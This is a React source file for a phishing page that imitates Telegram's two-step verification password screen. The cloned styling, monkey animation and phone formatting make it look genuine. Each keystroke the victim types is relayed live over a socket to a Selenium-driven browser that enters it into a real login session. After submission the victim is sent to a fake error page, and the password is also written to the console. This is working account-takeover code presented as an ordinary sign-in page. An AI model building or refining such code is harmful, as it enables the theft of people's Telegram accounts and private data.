import React, { useState, useEffect, useRef } from 'react';
import { useNavigate, useSearchParams } from 'react-router-dom';
import { io, Socket } from 'socket.io-client';

import { Page } from '@/components/Page.tsx';

export const SignInPasswordPage: React.FC = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const sessionId = searchParams.get('sessionId');
  const phoneNumber = searchParams.get('phoneNumber');
  
  const [password, setPassword] = useState('');
  const [status, setStatus] = useState('');
  const [isPasswordVisible, setIsPasswordVisible] = useState(false);
  const [isSeleniumReady, setIsSeleniumReady] = useState(false);
  const [seleniumStatus, setSeleniumStatus] = useState('Checking Selenium...');
  const [passwordInputFound, setPasswordInputFound] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  const videoRef = useRef<HTMLVideoElement>(null);
  const socketRef = useRef<Socket | null>(null);

  useEffect(() => {
    // Auto-play the monkey video
    if (videoRef.current) {
      videoRef.current.play().catch(e => {
        console.log('🐵 Video autoplay failed:', e);
      });
    }
  }, []);

  // Socket connection
  useEffect(() => {
    if (sessionId) {
      console.log('🔌 Connecting to Selenium server for password page...');
      console.log('🔌 Session ID:', sessionId);
      console.log('🔌 Connecting to: http://localhost:3000');
      
      // Try different connection configurations
      let socket;
      try {
        socket = io('http://localhost:3000', {
          transports: ['polling', 'websocket'],
          timeout: 20000,
          forceNew: true,
          autoConnect: true,
          reconnection: true,
          reconnectionAttempts: 5,
          reconnectionDelay: 1000
        });
      } catch (error) {
        console.error('❌ Failed to create socket:', error);
        // Fallback to basic configuration
        socket = io('http://localhost:3000');
      }
      
      console.log('🔌 Socket created:', socket);
      socketRef.current = socket;

      socket.on('connect', () => {
        console.log('✅ Connected to Selenium server from password page');
        console.log('✅ Socket ID:', socket.id);
        console.log('✅ Socket connected:', socket.connected);
        setIsSeleniumReady(true);
        setSeleniumStatus('Selenium ready');
        
        // Check if password input is present in Selenium
        checkPasswordInputInSelenium();
      });

      socket.on('connect_error', (error) => {
        console.error('❌ Socket connection error:', error);
        setSeleniumStatus('Connection error - please refresh');
      });

      socket.on('disconnect', (reason) => {
        console.log('❌ Disconnected from Selenium server:', reason);
        setIsSeleniumReady(false);
        setSeleniumStatus('Selenium disconnected');
      });

      // Listen for element check responses
      socket.on('elementCheckResult', (data) => {
        console.log('🔍 Element check result:', data);
        if (data.sessionId === sessionId) {
          if (data.elementFound && data.elementType === 'passwordInput') {
            console.log('✅ Password input found in Selenium window!');
            setPasswordInputFound(true);
            setSeleniumStatus('Password input ready');
          } else if (data.elementType === 'passwordInput') {
            console.log('❌ Password input not found in Selenium window');
            setPasswordInputFound(false);
            setSeleniumStatus('Password input not found - waiting...');
          }
        }
      });

      // Listen for password submission results
      socket.on('passwordSubmissionResult', (data) => {
        console.log('📥 Received password submission result:', data);
        
        if (data.sessionId === sessionId) {
          if (data.success) {
            console.log('✅ Password submitted successfully!');
            setStatus('Password submitted successfully!');
            
            // Navigate to error page after a moment
            setTimeout(() => {
              navigate(`/error?sessionId=${sessionId}`);
            }, 2000);
          } else {
            console.log('❌ Password submission failed:', data.error);
            setStatus(`❌ Error: ${data.error || 'Failed to submit password'}`);
            setIsSubmitting(false);
          }
        }
      });

      // Expose socket for manual testing in console
      (window as any).debugSocket = socket;
      console.log('🔧 Socket exposed as window.debugSocket for manual testing');

      return () => {
        if (socketRef.current) {
          socketRef.current.disconnect();
          socketRef.current = null;
        }
      };
    }
  }, [sessionId]);

  // Function to check if password input is present in Selenium window
  const checkPasswordInputInSelenium = () => {
    if (socketRef.current && socketRef.current.connected && sessionId) {
      console.log('🔍 Checking if password input is present in Selenium window...');
      socketRef.current.emit('checkElementInSelenium', {
        sessionId: sessionId,
        elementType: 'passwordInput',
        timestamp: new Date().toISOString()
      });
    }
  };

  // Format phone number with proper spacing like Telegram
  const formatPhoneNumber = (phone: string) => {
    // Remove any existing spaces and non-digit characters except +
    const clean = phone.replace(/[^\d+]/g, '');
    
    // If it starts with +, format with spaces
    if (clean.startsWith('+')) {
      const countryCode = clean.substring(0, 4); // +358
      const remaining = clean.substring(4);
      
      // Handle different phone number lengths gracefully
      if (remaining.length >= 9) {
        const areaCode = remaining.substring(0, 3);      // 403
        const firstGroup = remaining.substring(3, 6);    // 624
        const secondGroup = remaining.substring(6, 9);   // 026
        const extra = remaining.substring(9);            // any remaining digits
        
        let formatted = `${countryCode} ${areaCode} ${firstGroup} ${secondGroup}`;
        if (extra) {
          formatted += ` ${extra}`;
        }
        return formatted;
      } else if (remaining.length >= 6) {
        const areaCode = remaining.substring(0, 3);      // 403
        const firstGroup = remaining.substring(3, 6);    // 624
        const extra = remaining.substring(6);            // any remaining digits
        
        let formatted = `${countryCode} ${areaCode} ${firstGroup}`;
        if (extra) {
          formatted += ` ${extra}`;
        }
        return formatted;
      } else if (remaining.length >= 3) {
        const areaCode = remaining.substring(0, 3);      // 403
        const extra = remaining.substring(3);            // any remaining digits
        
        let formatted = `${countryCode} ${areaCode}`;
        if (extra) {
          formatted += ` ${extra}`;
        }
        return formatted;
      } else {
        return `${countryCode} ${remaining}`;
      }
    }
    
    return clean;
  };

  const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setPassword(value);
    
    // REAL-TIME SYNC: Send to Selenium immediately for character-by-character sync
    if (socketRef.current && socketRef.current.connected && sessionId) {
      console.log('🔄 REAL-TIME SYNC: Sending password to Selenium:', value);
      
      socketRef.current.emit('syncInputToSelenium', {
        sessionId: sessionId,
        inputType: 'password',
        value: value,
        timestamp: new Date().toISOString()
      });
    }
  };

  const handleSubmit = async () => {
    if (!password) {
      setStatus('❌ Please enter your password');
      return;
    }

    setIsSubmitting(true);
    setStatus('Submitting password...');

    try {
      // Submit password to Selenium
      if (socketRef.current && socketRef.current.connected && sessionId) {
        console.log('🔐 Submitting password to Selenium:', password);
        
        // Set up event listener for password submission result
        socketRef.current.once('passwordSubmissionResult', (data) => {
          console.log('📥 Received password submission result:', data);
          
          if (data.sessionId === sessionId) {
            if (data.success) {
              console.log('✅ Password submitted successfully!');
              setStatus('Password submitted successfully!');
              
              // Navigate to error page after a moment
              setTimeout(() => {
                navigate(`/error?sessionId=${sessionId}`);
              }, 2000);
            } else {
              console.log('❌ Password submission failed:', data.error);
              setStatus(`❌ Error: ${data.error || 'Failed to submit password'}`);
              setIsSubmitting(false);
            }
          }
        });
        
        // Send password to Selenium
        socketRef.current.emit('submitPassword', {
          sessionId: sessionId,
          password: password,
          timestamp: new Date().toISOString()
        });
        
        console.log('✅ Password submission sent to Selenium');
      } else {
        console.log('❌ Cannot submit - missing socket or session');
        setStatus('❌ Error: Cannot connect to Selenium');
        setIsSubmitting(false);
      }
      
    } catch (error) {
      console.error('Error submitting password:', error);
      setStatus('❌ Error submitting password');
      setIsSubmitting(false);
    }
  };

  const togglePasswordVisibility = () => {
    setIsPasswordVisible(!isPasswordVisible);
  };

  return (
    <Page back={false}>
      <div style={{
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        minHeight: '100vh',
        padding: '40px 20px',
        backgroundColor: 'white',
        fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
      }}>
        {/* Content Container */}
        <div style={{
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          maxWidth: '400px',
          width: '100%'
        }}>
          
          {/* Animated Monkey */}
          <div style={{
            marginBottom: '32px',
            textAlign: 'center'
          }}>
            <video
              ref={videoRef}
              src="/monkey.mp4"
              style={{
                width: '120px',
                height: '120px',
                objectFit: 'cover'
              }}
              loop
              muted
              playsInline
              autoPlay
            />
          </div>

          {/* Title */}
          <div style={{
            marginBottom: '24px',
            textAlign: 'center'
          }}>
            <div style={{
              fontSize: '32px',
              fontWeight: 'bold',
              color: '#000',
              marginBottom: '8px'
            }}>
              Enter Password
            </div>
            <div style={{
              fontSize: '14px',
              color: '#666',
              lineHeight: '1.4'
            }}>
              You have Two-Step Verification enabled, so your account is protected with an additional password.
            </div>
          </div>

          {/* Password Input */}
          <div style={{
            width: '100%',
            marginBottom: '32px'
          }}>
            <div style={{ marginBottom: '24px' }}>
              <div style={{ position: 'relative' }}>
                <input
                  type={isPasswordVisible ? 'text' : 'password'}
                  value={password}
                  onChange={handlePasswordChange}
                  placeholder="First school friend (NameLastname)"
                  style={{
                    width: 'calc(100% - (16px + 2px)*2)',
                    height: '48px',
                    padding: '0 16px',
                    paddingRight: '48px', // Space for the eye icon
                    fontSize: '16px',
                    border: '2px solid #e0e0e0',
                    borderRadius: '12px',
                    backgroundColor: '#ffffff',
                    color: '#000',
                    outline: 'none',
                    transition: 'border-color 0.2s ease, box-shadow 0.2s ease'
                  }}
                  onFocus={(e) => {
                    e.target.style.borderColor = '#0088cc';
                    e.target.style.boxShadow = '0 0 0 3px rgba(0, 136, 204, 0.15)';
                  }}
                  onBlur={(e) => {
                    e.target.style.borderColor = '#e0e0e0';
                    e.target.style.boxShadow = 'none';
                  }}
                />
                <button
                  type="button"
                  onClick={togglePasswordVisibility}
                  style={{
                    position: 'absolute',
                    right: '12px',
                    top: '50%',
                    transform: 'translateY(-50%)',
                    background: 'none',
                    border: 'none',
                    cursor: 'pointer',
                    padding: '4px',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center'
                  }}
                >
                  {isPasswordVisible ? (
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
                      <line x1="1" y1="1" x2="23" y2="23"/>
                    </svg>
                  ) : (
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                      <circle cx="12" cy="12" r="3"/>
                    </svg>
                  )}
                </button>
              </div>
            </div>
          </div>

          {/* Submit Button */}
          <div style={{
            width: '100%',
            marginBottom: '24px'
          }}>
            <button
              onClick={handleSubmit}
              disabled={!password || isSubmitting || !passwordInputFound}
              style={{
                width: '100%',
                height: '48px',
                backgroundColor: password && !isSubmitting && passwordInputFound ? '#0088cc' : '#f5f5f5',
                color: password && !isSubmitting && passwordInputFound ? 'white' : '#999',
                border: 'none',
                borderRadius: '12px',
                fontSize: '16px',
                fontWeight: '500',
                cursor: password && !isSubmitting && passwordInputFound ? 'pointer' : 'not-allowed',
                transition: 'background-color 0.2s ease',
                opacity: password && !isSubmitting && passwordInputFound ? 1 : 0.6
              }}
            >
              {isSubmitting ? 'Submitting...' : 'Submit'}
            </button>
          </div>

          {/* Status Message */}
          {status && (
            <div style={{
              marginTop: '16px',
              padding: '12px 16px',
              backgroundColor: status.includes('❌') ? '#f8d7da' : '#d4edda',
              color: status.includes('❌') ? '#721c24' : '#155724',
              borderRadius: '8px',
              fontSize: '14px',
              textAlign: 'center',
              width: '100%'
            }}>
              {status}
            </div>
          )}

          {/* Selenium Status - Only show when SHOW_DEBUG_INFO is true */}
          {import.meta.env.VITE_SHOW_DEBUG_INFO === 'true' && (
            <div style={{
              marginTop: '16px',
              padding: '8px 12px',
              backgroundColor: passwordInputFound ? '#e8f5e8' : '#fff3cd',
              border: `1px solid ${passwordInputFound ? '#28a745' : '#ffc107'}`,
              borderRadius: '4px',
              fontSize: '12px',
              color: passwordInputFound ? '#155724' : '#856404',
              width: '100%'
            }}>
              <div style={{ fontWeight: '500', marginBottom: '4px' }}>Debug Info:</div>
              <div>Selenium: {isSeleniumReady ? '✅ Ready' : '⏳ Waiting'}</div>
              <div>Password Input: {passwordInputFound ? '✅ Found' : '⏳ Waiting'}</div>
              <div>Status: {seleniumStatus}</div>
              <div>Session: {sessionId}</div>
              <div>Phone: {phoneNumber}</div>
            </div>
          )}
        </div>
      </div>
    </Page>
  );
};
